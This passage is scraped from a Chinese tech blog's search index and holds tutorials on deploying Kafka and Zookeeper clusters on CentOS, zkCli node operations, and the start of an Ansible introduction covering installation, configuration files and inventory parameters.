Kubernetes（通常被简称为K8s）是一个开源的容器编排和管理平台，用于自动化容器化应用程序的部署、扩展和操作。它由Google开发并捐赠给了云原生计算基金会（CNCF）。Kubernetes旨在解决容器化应用程序的管理和部署问题，使开发人员能够更轻松地构","title":"Kubeadm部署k8s集群"},{"content":"一、Kafka 简介： Apache Kafka 是一个开源的分布式事件流平台，最初由 LinkedIn 开发，后来成为 Apache 软件基金会的顶级项目。它主要用于处理实时数据流，将数据从一个地方传输到另一个地方。Kafka 的设计理念是基于发布订阅模型，通过使用主题（topics）来组织和分类数据流。\nKafka 具有以下主要组件：\nProducer（生产者）： 用于将数据发布到 Kafka 主题，这些数据可以是日志、事件、指标等。\nBroker： Kafka 集群由多个 Broker 组成，每个 Broker 是一个独立的服务器，负责存储数据和处理数据流。\nTopic（主题）： 数据流被组织成主题，生产者将数据发布到主题，消费者从主题订阅数据。\nConsumer（消费者）： 消费者从主题订阅数据，并进行相应的处理。消费者可以以不同的消费组（Consumer Group）来组织，以实现水平扩展和并行处理。\nZookeeper： 虽然 Kafka 从 0.10 版本开始逐步减少对 Zookeeper 的依赖，但在之前的版本中，Zookeeper 用于管理 Kafka 集群的元数据和状态。\n二、Kafka 使用场景： 实时数据流处理： Kafka 可以用于构建实时数据流处理平台，用于收集、传输和处理大量的实时数据，如日志、事件、传感器数据等。\n日志收集和分析： 很多组织使用 Kafka 来收集分布在不同系统上的日志数据，并将其传输到集中的存储或分析系统中。\n事件驱动架构： Kafka 可以作为事件驱动架构的核心，不同的服务可以通过发布和订阅事件来实现解耦和扩展。\n指标和监控数据传输： Kafka 可以用于传输各种系统指标和监控数据，以便进行实时监控和分析。\n流式 ETL（Extract, Transform, Load）： Kafka 可以用作数据源和数据目标，支持流式 ETL 过程，使数据在不同系统之间流动和转换。\n消息队列： Kafka 可以作为高吞吐量的消息队列，用于在不同的应用程序和服务之间传递消息。\n日志压缩存储： Kafka 可以用于长期存储数据，比如保存历史事件和数据备份。\n总之，Kafka 在处理实时数据流、构建事件驱动架构以及实现可靠的数据传输方面具有广泛的应用场景。它的高吞吐量、可扩展性和持久性特征使其成为许多实时应用和大数据处理场景的理想选择。\n三、Kafka 集群部署 3.1 实验环境 注意：以下三个节点已经提前部署了 zookeeper 集群（Kafka 集群依赖 zookeeper ）\n主机名 IP 系统 配置 kafka-01 10.0.0.11 CentOS 7.6 1U 2G kafka-02 10.0.0.12 CentOS 7.6 1U 2G kafka-03 10.0.0.13 CentOS 7.6 1U 2G 3.2 配置 Java 环境 所有节点执行：\nyum install java-1.8.0-openjdk -y java -version 3.3 下载并解压安装包 下载地址：Apache Kafka\n所有节点执行：\ncd /usr/local/src wget https://archive.apache.org/dist/kafka/2.1.0/kafka_2.12-2.1.0.tgz tar xf kafka_2.12-2.1.0.tgz ln -sv /usr/local/src/kafka_2.12-2.1.0 /usr/local/kafka cd /usr/local/kafka/ # 根据需要修改配置文件 cat \u0026gt; config/server.properties \u0026lt;\u0026lt; EOF broker.id=0 num.network.threads=3 num.io.threads=8 socket.send.buffer.bytes=102400 socket.receive.buffer.bytes=102400 socket.request.max.bytes=104857600 log.dirs=/usr/local/kafka/kafka-logs num.partitions=1 num.recovery.threads.per.data.dir=1 offsets.topic.replication.factor=1 transaction.state.log.replication.factor=1 transaction.state.log.min.isr=1 log.retention.hours=168 log.segment.bytes=1073741824 log.retention.check.interval.ms=300000 zookeeper.connect=localhost:2181 zookeeper.connection.timeout.ms=6000 group.initial.rebalance.delay.ms=0 EOF 参数解释：\n这是一个 Kafka Broker 的配置示例，其中包含了一些常见的配置项。下面逐一解释每个配置项的含义：\nbroker.id=0： 设置 Broker 的唯一标识符。在一个 Kafka 集群中，每个 Broker 都应该有一个独一无二的 ID。 num.network.threads=3： 指定处理网络请求的线程数，用于接收和处理客户端连接和请求。 num.io.threads=8： 指定执行 I/O 操作的线程数，用于处理磁盘读写等操作。 socket.send.buffer.bytes=102400： 设置套接字发送缓冲区的大小，以字节为单位。 socket.receive.buffer.bytes=102400： 设置套接字接收缓冲区的大小，以字节为单位。 socket.request.max.bytes=104857600： 设置单个请求的最大字节数，用于限制单个请求的大小。 log.dirs=/usr/local/kafka/kafka-logs： 指定 Kafka 日志文件的存储路径。Kafka 会将主题数据以日志文件的形式存储在这些目录下。 num.partitions=1： 设置默认主题的分区数。每个主题可以被分为多个分区，这个配置项定义了新建主题时的默认分区数。 num.recovery.threads.per.data.dir=1： 指定在每个数据目录上运行的恢复线程数，用于在 Broker 启动时进行数据恢复。 offsets.topic.replication.factor=1： 设置存储消费者偏移量信息的内部主题的复制因子。这个值定义了偏移量信息的冗余备份数。 transaction.state.log.replication.factor=1： 设置存储事务状态的内部主题的复制因子。 transaction.state.log.min.isr=1： 设置事务状态日志的最小副本同步数。如果可用的副本数量低于这个值，就不允许写入事务状态。 log.retention.hours=168： 设置日志文件的保留时间，以小时为单位。超过这个时间的日志文件将被自动删除。 log.segment.bytes=1073741824： 设置日志段（log segment）的最大大小，以字节为单位。一旦日志段达到这个大小，Kafka 将创建一个新的日志段。 log.retention.check.interval.ms=300000： 设置日志保留策略的检查间隔，以毫秒为单位。Kafka 将在这个时间间隔内检查是否需要删除过期的日志文件。 zookeeper.connect=localhost:2181： 指定 Zookeeper 的连接地址，用于管理 Kafka 集群的元数据和状态。 zookeeper.connection.timeout.ms=6000： 设置与 Zookeeper 的连接超时时间，以毫秒为单位。 group.initial.rebalance.delay.ms=0： 设置消费者组初始再平衡的延迟时间，以毫秒为单位。设置为0表示消费者加入消费者组后立即进行再平衡。 这些配置项是 Kafka 集群中的 Broker 部分的配置，它们可以根据需求进行调整以满足性能、可靠性和资源管理等方面的要求。\n3.3 修改集群配置 kafka-01 执行：\n# 配置集群 ID sed -i \u0026#39;s/broker\\.id=0/broker\\.id=1/g\u0026#39; config/server.properties # 修改服务监听地址，默认是localhost:9092 echo \u0026#34;listeners=PLAINTEXT://10.0.0.11:9092\u0026#34; \u0026gt;\u0026gt; config/server.properties kafka-02 执行：\nsed -i \u0026#39;s/broker\\.id=0/broker\\.id=2/g\u0026#39; config/server.properties echo \u0026#34;listeners=PLAINTEXT://10.0.0.12:9092\u0026#34; \u0026gt;\u0026gt; config/server.properties kafka-03 执行：\nsed -i \u0026#39;s/broker\\.id=0/broker\\.id=3/g\u0026#39; config/server.properties echo \u0026#34;listeners=PLAINTEXT://10.0.0.13:9092\u0026#34; \u0026gt;\u0026gt; config/server.properties 3.4 启动服务 zookeeper-01 执行：\n# 启动服务 cd /usr/local/kafka/ bin/kafka-server-start.sh -daemon config/server.properties #查看端口 [root@kafka-01 kafka]# ss -ntl | grep 9092 LISTEN 0 50 :::9092 :::* zookeeper-02 执行：\ncd /usr/local/kafka/ bin/kafka-server-start.sh -daemon config/server.properties #查看端口 [root@kafka-01 kafka]# ss -ntl | grep 9092 LISTEN 0 50 :::9092 :::* zookeeper-03 执行：\ncd /usr/local/kafka/ bin/kafka-server-start.sh -daemon config/server.properties #查看端口 [root@kafka-01 kafka]# ss -ntl | grep 9092 LISTEN 0 50 :::9092 :::* 四、Kafka 数据读写 Kafka自带了一些用于操作和管理Kafka集群的Shell脚本。以下是一些常用的Kafka自带Shell脚本示例：\n1. 创建主题：\n使用kafka-topics.sh脚本创建一个名为\u0026quot;test-topic\u0026quot;的主题，具有3个分区和1个副本：\n./kafka-topics.sh --create --topic test-topic --zookeeper localhost:2181 --partitions 3 --replication-factor 1 2. 发送消息：\n使用kafka-console-producer.sh脚本发送消息到\u0026quot;test-topic\u0026quot;主题：\n[root@kafka-01 bin]# ./kafka-console-producer.sh --topic test-topic --broker-list localhost:9092 OpenJDK 64-Bit Server VM warning: If the number of processors is expected to increase from one, then you should configure the number of parallel GC threads appropriately using -XX:ParallelGCThreads=N \u0026gt;hello \u0026gt;world \u0026gt;end \u0026gt;^C 3. 接收消息：\n使用kafka-console-consumer.sh脚本从\u0026quot;test-topic\u0026quot;主题消费消息：\n[root@kafka-01 bin]# ./kafka-consoconsumer.sh --topic test-topic --bootstrap-server localhost:9092 --from-beginning OpenJDK 64-Bit Server VM warning: If the number of processors is expected to increase from one, then you should configure the number of parallel GC threads appropriately using -XX:ParallelGCThreads=N hello world end 4. 查看主题列表：\n查看当前Kafka集群中的主题列表：\n./kafka-topics.sh --list --zookeeper localhost:2181 5. 查看消费者组列表：\n查看当前消费者组的列表：\n./kafka-consumer-groups.sh --list --bootstrap-server localhost:9092 6. 描述主题：\n获取关于主题\u0026quot;test-topic\u0026quot;的信息，如分区和副本分布情况：\n./kafka-topics.sh --describe --topic test-topic --zookeeper localhost:2181 7. 查看消费者组偏移量：\n查看消费者组\u0026quot;my-group\u0026quot;在主题\u0026quot;test-topic\u0026quot;上的消费偏移量：\n./kafka-consumer-groups.sh --describe --group my-group --bootstrap-server localhost:9092 当涉及删除主题和创建消费者组时，你可以使用Kafka自带的Shell脚本来执行这些操作。以下是删除主题和创建消费者组的示例：\n8. 删除主题：\n使用kafka-topics.sh脚本删除名为\u0026quot;test-topic\u0026quot;的主题：\n./kafka-topics.sh --delete --topic test-topic --zookeeper localhost:2181 请注意，删除主题会永久删除该主题的所有数据和配置，请谨慎操作。\n9. 创建消费者组：\n使用kafka-consumer-groups.sh脚本创建一个名为\u0026quot;my-consumer-group\u0026quot;的消费者组，并将其订阅到\u0026quot;test-topic\u0026quot;主题：\n./kafka-consumer-groups.sh --bootstrap-server localhost:9092 --create --topic test-topic --group my-consumer-group 附录 Kafka 中文文档 - ApacheCN\nKafka基本原理详解（超详细！）kafka工作原理\u0026lt;一蓑烟雨任平生\u0026gt;的博客-CSDN博客\n学习 Kafka 入门知识看这一篇就够了！（万字长文）-腾讯云开发者社区-腾讯云 (tencent.com)\n真的，搞懂 Kafka 看这一篇就够了！ - 掘金 (juejin.cn)\n","permalink":"https://senmer.github.io/zh/posts/tech/kafka/kafka%E7%AE%80%E4%BB%8B%E4%B8%8E%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2/","summary":"一、Kafka 简介： Apache Kafka 是一个开源的分布式事件流平台，最初由 LinkedIn 开发，后来成为 Apache 软件基金会的顶级项目。它主要用于处理实时数据流，将数据从一个地方传输到另一个地方。Kafka 的设计理念是基于发布订阅模型，通过使用主题（topics）来组织和分类数据流。 Kafka 具有以下主要组件： Produc","title":"Kafka简介与集群部署"},{"content":"一、Zookeeper 简介： Apache ZooKeeper 是一个分布式的开源协调服务，旨在帮助构建分布式应用程序和服务。它提供了一个高度可靠的、层次化的命名空间，类似于文件系统，用于存储和管理分布式应用程序中的配置信息、状态信息、命名服务等。ZooKeeper 的设计目标是为分布式系统提供强大的协调、同步和通知机制，以便在分布式环境中实现高可用性、一致性和可靠性。\nZooKeeper 主要特点包括：\n分布式协调： ZooKeeper 提供了分布式应用程序中的共享配置和状态信息的集中式存储，从而实现了分布式系统的协调。\n高可用性： ZooKeeper 的设计着重于高可用性，通过将数据复制到多个节点上以实现容错和故障恢复。\n一致性： ZooKeeper 提供了强一致性模型，确保在分布式系统中的不同节点之间保持一致的视图。\n顺序访问： ZooKeeper 为分布式系统中的事件引入了顺序性，使得事件在分布式环境中能够按照顺序进行处理。\n通知机制： ZooKeeper 允许客户端注册监听器以获取有关节点状态变化的通知，从而实现了分布式事件通知。\n二、Zookeeper 使用场景： 分布式协调：ZooKeeper 是最常见的用于分布式系统中协调任务的工具之一。它可以用来实现分布式锁、分布式队列、分布式选举等，确保不同节点之间的有序操作。\n配置管理：ZooKeeper 可以用于管理分布式系统的配置信息，如数据库连接信息、服务地址等。应用程序可以通过监听 ZooKeeper 上的配置节点来实现动态配置更新。\n命名服务：ZooKeeper 可以用作分布式命名服务，类似于 DNS，用于将逻辑名称映射到实际服务地址，以便在分布式系统中轻松查找服务。\n分布式锁：ZooKeeper 提供了分布式锁的实现，用于协调不同节点对共享资源的访问，确保在同一时刻只有一个节点可以访问该资源。\n分布式队列：ZooKeeper 可以用于创建分布式队列，用于在不同节点之间传递消息或任务，确保任务的有序执行。\n分布式通知：ZooKeeper 允许应用程序监听特定的节点，以获取关于集群状态变化的通知，从而实现及时响应和处理。\n分布式协调服务：ZooKeeper 本身就是一个分布式协调服务，可以用于管理和维护分布式系统中的一致性、状态同步等。\nLeader 选举：ZooKeeper 可以用于在分布式系统中选择一个节点作为领导者（Leader），以确保在节点故障时能够快速选举新的领导者。\n总的来说，ZooKeeper 在构建分布式系统时起到了关键的协调和管理作用，帮助开发人员处理分布式环境中的复杂性和挑战。然而，随着技术的发展，一些替代方案如 etcd、Consul 等也出现，可以用来实现类似的分布式协调和管理功能。\n三、Zookeeper 单机部署 3.1 实验环境 主机名 IP 系统 配置 zookeeper 10.0.0.10 CentOS 7.6 1U 2G 3.2 配置 java 环境 软件依赖：ZooKeeper: Because Coordinating Distributed Systems is a Zoo (apache.org)\n安装 openjdk\n[root@zookeeper ~]# yum install -y java-1.8.0-openjdk 查看结果\n[root@zookeeper ~]# java -version openjdk version \u0026#34;1.8.0_382\u0026#34; OpenJDK Runtime Environment (build 1.8.0_382-b05) OpenJDK 64-Bit Server VM (build 25.382-b05, mixed mode) 3.3 部署 zookeeper 3.3.1 下载并解压软件包 下载地址：Index of /dist/zookeeper (apache.org)\ncd /usr/local/src wget https://archive.apache.org/dist/zookeeper/zookeeper-3.4.13/zookeeper-3.4.13.tar.gz tar xf zookeeper-3.4.13.tar.gz ln -sv /usr/local/src/zookeeper-3.4.13 /usr/local/zookeeper 3.3.2 准备配置文件 这里保持默认配置，不做修改\n[root@zookeeper src]# cd zookeeper/conf/ [root@zookeeper conf]# cp zoo_sample.cfg zoo.cfg [root@zookeeper conf]# ls configuration.xsl log4j.properties zoo.cfg zoo_sample.cfg [root@zookeeper conf]# grep -v ^# zoo.cfg tickTime=2000 initLimit=10 syncLimit=5 dataDir=/tmp/zookeeper clientPort=2181 3.4 启动 zookeeper 服务 3.4.1 启动服务 [root@zookeeper conf]# cd /usr/local/zookeeper/ [root@zookeeper zookeeper]# bin/zkServer.sh start ZooKeeper JMX enabled by default Using config: /usr/local/zookeeper/bin/../conf/zoo.cfg Starting zookeeper ... STARTED 3.4.2 查看服务状态 [root@zookeeper zookeeper]# bin/zkServer.sh status ZooKeeper JMX enabled by default Using config: /usr/local/zookeeper/bin/../conf/zoo.cfg Mode: standalone # 单机模式 3.4.3 查看进程信息 [root@zookeeper zookeeper-3.4.13]# ps -ef | grep zookeeper root 8452 1 2 17:48 pts/0 00:00:00 java -Dzookeeper.log.dir=. -Dzookeeper.root.logger=INFO,CONSOLE -cp /usr/local/src/zookeeper-3.4.13/bin/../build/classes:/usr/local/src/zookeeper-3.4.13/bin/../build/lib/*.jar:/usr/local/src/zookeeper-3.4.13/bin/../lib/slf4j-log4j12-1.7.25.jar:/usr/local/src/zookeeper-3.4.13/bin/../lib/slf4j-api-1.7.25.jar:/usr/local/src/zookeeper-3.4.13/bin/../lib/netty-3.10.6.Final.jar:/usr/local/src/zookeeper-3.4.13/bin/../lib/log4j-1.2.17.jar:/usr/local/src/zookeeper-3.4.13/bin/../lib/jline-0.9.94.jar:/usr/local/src/zookeeper-3.4.13/bin/../lib/audience-annotations-0.5.0.jar:/usr/local/src/zookeeper-3.4.13/bin/../zookeeper-3.4.13.jar:/usr/local/src/zookeeper-3.4.13/bin/../src/java/lib/*.jar:/usr/local/src/zookeeper-3.4.13/bin/../conf: -Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.local.only=false org.apache.zookeeper.server.quorum.QuorumPeerMain /usr/local/src/zookeeper-3.4.13/bin/../conf/zoo.cfg root 8498 8326 0 17:49 pts/0 00:00:00 grep --color=auto zookeeper 四、Zookeeper 集群部署 4.1 实验环境 主机名 IP 系统 配置 zookeeper-01 10.0.0.11 CentOS 7.6 1U 2G zookeeper-02 10.0.0.12 CentOS 7.6 1U 2G zookeeper-03 10.0.0.13 CentOS 7.6 1U 2G 4.2 配置 Java 环境 所有节点执行：\nyum install java-1.8.0-openjdk -y java -version 4.3 下载并解压安装包 所有节点执行：\ncd /usr/local/src wget https://archive.apache.org/dist/zookeeper/zookeeper-3.4.13/zookeeper-3.4.13.tar.gz tar xf zookeeper-3.4.13.tar.gz ln -sv /usr/local/src/zookeeper-3.4.13 /usr/local/zookeeper mkdir /usr/local/zookeeper/data # 数据存放目录，如果不存在会自动创建 cd /usr/local/zookeeper/conf cp zoo_sample.cfg zoo.cfg\t# 根据需要修改配置文件 cat \u0026gt; zoo.cfg \u0026lt;\u0026lt; EOF tickTime=2000 initLimit=10 syncLimit=5 dataDir=/usr/local/zookeeper/data clientPort=2181 maxClientCnxns=4096 autopurge.snapRetainCount=128 autopurge.purgeInterval=1 server.1=10.0.0.11:2888:3888 server.2=10.0.0.12:2888:3888 server.3=10.0.0.13:2888:3888 EOF 参数解释：\ntickTime=2000 #服务器与服务器之间的单次心跳检测时间间隔，单位为毫秒 initLimit=10 #集群中 leader 服务器与 follower 服务器初始连接心跳次数，即多少个 2000 毫秒 syncLimit=5 # leader 与 follower 之间连接完成之后，后期检测发送和应答的心跳次数，如果该 follower 在设置的时间内(5*2000)不能与 leader 进行通信，那么此follower 将被视为不可用。 dataDir=/usr/local/zookeeper/data #自定义的 zookeeper 保存数据的目录 clientPort=2181 #客户端连接 Zookeeper 服务器的端口，Zookeeper 会监听这个端口，接受客户端的访问请求 maxClientCnxns=128 #单个客户端 IP 可以和 zookeeper 保持的连接数 autopurge.snapRetainCount=3 #3.4.0 中的新增功能：启用后，ZooKeeper 自动清除功能会将最新快照和相应的事务日志分别保留在 dataDir 和 dataLogDir 中，并删除其余部分，默认值为 3。最小值为 3。 autopurge.purgeInterval=1 # 3.4.0 及之后版本，ZK 提供了自动清理日志和快照文件的功能，这个参数指定了清理频率，单位是小时，需要配置一个 1 或更大的整数，默认是 0，表示不开启自动清理功能 server.1=10.0.0.11:2888:3888 # server.服务器编号=服务器IP:数据同步端口:选举端口 server.2=10.0.0.12:2888:3888 server.3=10.0.0.13:2888:3888 4.4 修改集群配置 zookeeper-01 执行：\n# 配置集群 ID echo 1 \u0026gt; /usr/local/zookeeper/data/myid zookeeper-02 执行：\necho 2 \u0026gt; /usr/local/zookeeper/data/myid zookeeper-03 执行：\necho 3 \u0026gt; /usr/local/zookeeper/data/myid 4.5 启动服务 zookeeper-01 执行：\n# 启动服务 cd /usr/local/zookeeper/ bin/zkServer.sh start #查看集群角色 [root@zookeeper-01 zookeeper]# bin/zkServer.sh status ZooKeeper JMX enabled by default Using config: /usr/local/zookeeper/bin/../conf/zoo.cfg Mode: follower zookeeper-02 执行：\n# 启动服务 cd /usr/local/zookeeper/ bin/zkServer.sh start [root@zookeeper-02 zookeeper]# ./bin/zkServer.sh status ZooKeeper JMX enabled by default Using config: /usr/local/zookeeper/bin/../conf/zoo.cfg Mode: leader # leader 额外开启一个 2888 端口用于同步数据 [root@zookeeper-03 zookeeper]# ss -ntl|grep 2888 LISTEN 0 50 ::ffff:10.0.0.13:2888 :::* zookeeper-03 执行：\n# 启动服务 cd /usr/local/zookeeper/ bin/zkServer.sh start [root@zookeeper-03 zookeeper]# bin/zkServer.sh status ZooKeeper JMX enabled by default Using config: /usr/local/zookeeper/bin/../conf/zoo.cfg Mode: follower 五、Zookeeper 数据增删改查 Zookeeper 是一个分布式的开源协调服务，常用于管理和维护分布式系统中的配置信息、命名服务、分布式锁等。它提供了一个层次化的命名空间（类似于文件系统），通过树状结构来存储数据。下面是一些基本的 Zookeeper 命令示例，用于增删改查 Zookeeper 中的数据节点：\n可用的客户端工具：zzhang5/zooinspector: An improved zookeeper inspector (github.com)\n5.1 语法简介 连接到 Zookeeper：\n在终端中运行以下命令以连接到 Zookeeper 服务器：\nzkCli.sh -server \u0026lt;ZOOKEEPER_SERVER\u0026gt;:\u0026lt;PORT\u0026gt; 其中，\u0026lt;ZOOKEEPER_SERVER\u0026gt; 是 Zookeeper 服务器的地址，\u0026lt;PORT\u0026gt; 是 Zookeeper 服务器的端口，默认为 2181。\n创建节点：\n在 Zookeeper 中，可以使用 create 命令来创建一个新的节点。\ncreate /mynode \u0026#34;Hello, Zookeeper!\u0026#34; 获取节点数据：\n使用 get 命令可以获取节点的数据。\nget /mynode 更新节点数据：\n使用 set 命令来更新节点的数据。\nset /mynode \u0026#34;Updated data\u0026#34; 列出子节点：\n使用 ls 命令列出节点的子节点。\nls /path/to/parent_node 删除节点：\n使用 delete 命令来删除节点。\ndelete /path/to/node 5.2 实例演示 连接集群中的任意节点，这里选择 zookeeper-01\n[root@zookeeper-01 zookeeper]# bin/zkCli.sh -server 10.0.0.11 [zk: 10.0.0.11(CONNECTED) 2] help # help 查看帮助 ZooKeeper -server host:port cmd args stat path [watch] set path data [version] ls path [watch] delquota [-n|-b] path ls2 path [watch] setAcl path acl setquota -n|-b val path history redo cmdno printwatches on|off delete path [version] sync path listquota path rmr path get path [watch] create [-s] [-e] path data acl addauth scheme auth quit getAcl path close connect host:port [zk: 10.0.0.11(CONNECTED) 0] create /test \u0026#34;hello\u0026#34; # 创建节点 Created /test [zk: 10.0.0.11(CONNECTED) 1] get /test\t# 查看节点内容 hello cZxid = 0x800000004 ctime = Wed Aug 30 18:08:30 CST 2023 mZxid = 0x800000004 mtime = Wed Aug 30 18:08:30 CST 2023 pZxid = 0x800000004 cversion = 0 dataVersion = 0 aclVersion = 0 ephemeralOwner = 0x0 dataLength = 5 numChildren = 0 [zk: 10.0.0.11(CONNECTING) 0] ls /test # 查看节点 [] [zk: 10.0.0.11(CONNECTED) 1] create /test/app1 # 创建节点，但未给出值 [zk: 10.0.0.11(CONNECTED) 2] ls /test/app1 # 实际未创建成功 Node does not exist: /test/app1 [zk: 10.0.0.11(CONNECTED) 3] create /test/app1 \u0026#34;my first app\u0026#34; # 再次创建子节点并赋值 Node already exists: /test/app1 [zk: 10.0.0.11(CONNECTED) 4] ls /test/app1 # 创建成功 [] [zk: 10.0.0.11(CONNECTED) 5] ls /test/app1/ # 查看节点，末尾不能带 \u0026#39;/\u0026#39; Command failed: java.lang.IllegalArgumentException: Path must not end with / character [zk: 10.0.0.11(CONNECTED) 6] set /test \u0026#34;world\u0026#34; # 更新节点的值 cZxid = 0x800000004 ctime = Wed Aug 30 18:08:30 CST 2023 mZxid = 0x800000010 mtime = Wed Aug 30 18:28:38 CST 2023 pZxid = 0x80000000d cversion = 1 dataVersion = 1 aclVersion = 0 ephemeralOwner = 0x0 dataLength = 5 numChildren = 1 [zk: 10.0.0.11(CONNECTED) 7] get /test # 再次查看，更新成功 world cZxid = 0x800000004 ctime = Wed Aug 30 18:08:30 CST 2023 mZxid = 0x800000012 mtime = Wed Aug 30 18:28:38 CST 2023 pZxid = 0x80000000d cversion = 1 dataVersion = 3 aclVersion = 0 ephemeralOwner = 0x0 dataLength = 5 numChildren = 1 [zk: 10.0.0.11(CONNECTED) 8] delete /test # 删除节点，因为存在字节的，所以删除失败 Node not empty: /test [zk: 10.0.0.11(CONNECTED) 9] delete /test/app1 # 先删除子节点 [zk: 10.0.0.11(CONNECTED) 10] delete /test # 再次删除父节点成功 附录 可能是把 ZooKeeper 概念讲的最清楚的一篇文章 | 断念梦 (desistdaydream.github.io)\nZooKeeper的十二连问，你顶得了嘛？ - Jay_huaxiao - 博客园 (cnblogs.com)\nZookeeper:新增、查看、修改、删除节点 - 秋风飒飒吹 - 博客园 (cnblogs.com)\n一篇文章搞懂 ZooKeeper 的选举机制 - 掘金 (juejin.cn)\n3. zookeeper 选举机制 - 简书 (jianshu.com)\nZookeeper选举算法原理（摘选） - 简书 (jianshu.com)\n【Zookeeper】Zookeeper的Leader选举流程 - 周二鸭 - 博客园 (cnblogs.com)\nZookeeper：Zookeeper的主从选举机制-腾讯云开发者社区-腾讯云 (tencent.com)\n","permalink":"https://senmer.github.io/zh/posts/tech/zookeeper/zookeeper/","summary":"一、Zookeeper 简介： Apache ZooKeeper 是一个分布式的开源协调服务，旨在帮助构建分布式应用程序和服务。它提供了一个高度可靠的、层次化的命名空间，类似于文件系统，用于存储和管理分布式应用程序中的配置信息、状态信息、命名服务等。ZooKeeper 的设计目标是为分布式系统提供强大的协调、同步和","title":"Zookeeper"},{"content":"1 Ansible 简介 1.1 Ansible 发展史 作者：Michael DeHaan（ Cobbler 与 Func 作者）\nAnsible 的名称来自科幻小说《安德的游戏》中跨越时空的即时通信工具，使用它可以在相距数光年的距离，远程实时控制前线的舰队战斗。\n2012-03-09，发布0.0.1版，2015-10-17，Red Hat宣布1.5亿美元收购Ansible。\nAnsible「2.9」 中文官方文档 — Ansible Documentation (cn-ansibledoc.readthedocs.io)\n1.2 Ansible 功能 批量远程执行命令、安装和配置各种服务 利用 Playbook 和 Role 编排企业级的复杂的 IT 架构任务 提供自动化运维工具的开发 API，如 JumpServer 就是基于 Ansible 实现自动化管理功能 1.3 Ansible 特点 1.3.1 优点 功能丰富：模块数量达数千个，且支持自定义模块和多数编程语言 简单易用：Ansible 不使用 C/S 架构管理节点，即没有 Agent，去中心化管理方式 安全：基于 OpenSSH 协议实现安全通讯，无需专用协议 幂等性：可以重复多次执行，对系统不会产生影响 使用 YAML 格式的配置文件，简单易读 Playbook 和 Role 支持编排复杂任务，增强代码复用性 Python 语言实现, 基于 Paramiko（ python 对 ssh 的实现），PyYAML，Jinja2（模板语言）三个关 键模块 1.3.2 缺点 管理主机较多时，执行效率不如 saltstack 当前还不支持像 MySQL 数据库类似的事务回滚 1.3.3 注意事项 安装了 ansible 的主机官方称之为管理机，工作中也常称之为：中控、主控、master 或者堡垒机\n被管理的主机一般称之为受管理节点，被控端，受控端\n管理机 Python 版本需要 2.6 及以上\n受管理节点 Python 版本低于 2.4 ，需要安装 python-simplejson\n受管理节点如果启用 SELinux ，需要安装 libselinux-python\nWindows 不能做为管理机，只能是受管理节点\n2 Ansible 安装和常见模块 2.1 Ansible 安装 中文文档：安装 Ansible — Ansible Documentation (cn-ansibledoc.readthedocs.io)\n英文文档：Ansible Documentation — Ansible Documentation\nCentOS 安装:\nyum install -y ansible Ubuntu 安装：\napt install -y ansible pip 安装（不推荐）：\npip install ansible 查看已安装的 ansible 版本\nansible --version 2.2 Ansible 相关文件 2.2.1 Ansible 配置文件列表 /etc/ansible/ansible.cfg 主配置文件，如果需要，可以为每个项目创建独有的 ansible.cfg 文件。 /etc/ansible/hosts 主机清单文件，包含所有受管理节点的 IP 及其他相关信息 /etc/ansible/roles 存放各个角色的目录 2.2.2 Ansible 主配置文件 Ansible 的配置文件可以有多个来源，优先级从高到低顺序如下：\nANSIBLE_CONFIG #环境变量 ./ansible.cfg\t~/.ansible.cfg /etc/ansible/ansible.cfg\t#系统默认配置 Ansible 的默认配置文件 /etc/ansible/ansible.cfg ，其中大部分注释内容即为默认值，没有特殊需要，可以不用修改。\n[defaults] # some basic default values... #inventory = /etc/ansible/hosts #library = /usr/share/my_modules/ #module_utils = /usr/share/my_module_utils/ #remote_tmp = ~/.ansible/tmp #local_tmp = ~/.ansible/tmp #plugin_filters_cfg = /etc/ansible/plugin_filters.yml #forks = 5 #poll_interval = 15 #sudo_user = root #ask_sudo_pass = True #ask_pass = True #transport = smart #remote_port = 22 #module_lang = C #module_set_locale = False # plays will gather facts by default, which contain information about 范例：通过环境变量 ANSIBLE_CONFIG 指定 ansible 配置文件路径\n[root@ansible ~]# ll /data/ansible.cfg # 并不存在的配置文件 ls: cannot access /data/ansible.cfg: No such file or directory [root@ansible ~]# export ANSIBLE_CONFIG=/data/ansible.cfg [root@ansible ~]# ansible --version ansible 2.9.27 config file = /etc/ansible/ansible.cfg # 还是默认配置文件 configured module search path = [u\u0026#39;/root/.ansible/plugins/modules\u0026#39;, u\u0026#39;/usr/share/ansible/plugins/modules\u0026#39;] ansible python module location = /usr/lib/python2.7/site-packages/ansible executable location = /usr/bin/ansible python version = 2.7.5 (default, Oct 30 2018, 23:45:53) [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)] [root@ansible ~]# touch /data/ansible.cfg #创建此文件 [root@ansible ~]# ansible --version ansible 2.9.27 config file = /data/ansible.cfg # 成功指定 configured module search path = [u\u0026#39;/root/.ansible/plugins/modules\u0026#39;, u\u0026#39;/usr/share/ansible/plugins/modules\u0026#39;] ansible python module location = /usr/lib/python2.7/site-packages/ansible executable location = /usr/bin/ansible python version = 2.7.5 (default, Oct 30 2018, 23:45:53) [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)] 2.2.3 Inventory 主机清单文件 ansible 的主要功能在于批量管理主机，这些被管理的主机就使用 inventory 文件来指定。\n生产环境可以为每个项目创建独有的 ansible.cfg 文件和 hosts 文件，实现项目之前的隔离管理。\n官方文档：https://docs.ansible.com/ansible/latest/user_guide/intro_inventory.html\n主机清单文件格式\ninventory 文件遵循 INI 文件风格，可以对主机进行分组管理，且可以针对每个主机指定非默认的端口和账号等信息\n常用 Inventory 参数说明\nansible_ssh_host # 远程主机名与想要设定的主机的别名不同的话，可通过此变量设置。 ansible_ssh_port # ssh 端口号，如果不是默认的端口号，通过此变量设置。或者ip:端口的形式指定 192.168.1.100:2222 ansible_ssh_user # ssh 用户名 ansible_ssh_pass # ssh 密码(这种方式并不安全，强烈建议使用 --ask-pass 或者配置 ssh 免密) ansible_sudo_pass # sudo 密码(这种方式并不安全，强烈建议使用 --ask-sudo-pass) ansible_sudo_exe (new in version 1.8) # sudo 命令路径(适用于1.8及以上版本) ansible_connection # 与主机的连接类型.比如:local, ssh 或者 paramiko。 Ansible 1.2 以前默认使用 paramiko。1.2 以后默认使用 \u0026#39;smart\u0026#39;，\u0026#39;smart\u0026#39; 方式会根据是否支持 ControlPersist, 来判断\u0026#39;ssh\u0026#39; 方式是否可行。 ansible_ssh_private_key_file # ssh 使用的私钥文件，适用于有多个密钥，而你不想使用 ssh 